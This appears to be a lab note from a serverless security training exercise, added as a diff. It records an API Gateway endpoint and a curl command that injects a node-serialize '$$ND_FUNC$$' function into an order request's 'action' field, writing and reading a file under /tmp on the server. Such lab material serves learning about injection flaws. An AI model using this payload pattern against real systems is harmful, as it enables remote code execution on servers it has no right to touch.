@@ -1,0 +1,11 @@
+# Lesson 1: Event Injection
+
+API Endpoint:
+https://yoqkwmk19l.execute-api.us-east-1.amazonaws.com/Stage/order
+
+Curl Command Used:
+
+curl -X POST "https://yoqkwmk19l.execute-api.us-east-1.amazonaws.com/Stage/order" ^
+-H "Content-Type: application/json" ^
+-H "authorization: dummy" ^
+-d "{\"action\":\"$$ND_FUNC$$function(){var fs=require('fs');fs.writeFileSync('/tmp/pwned.txt','HACKED');var data=fs.readFileSync('/tmp/pwned.txt','utf-8');console.error('FILE:'+data);}()\",\"cart-id\":\"test\"}"
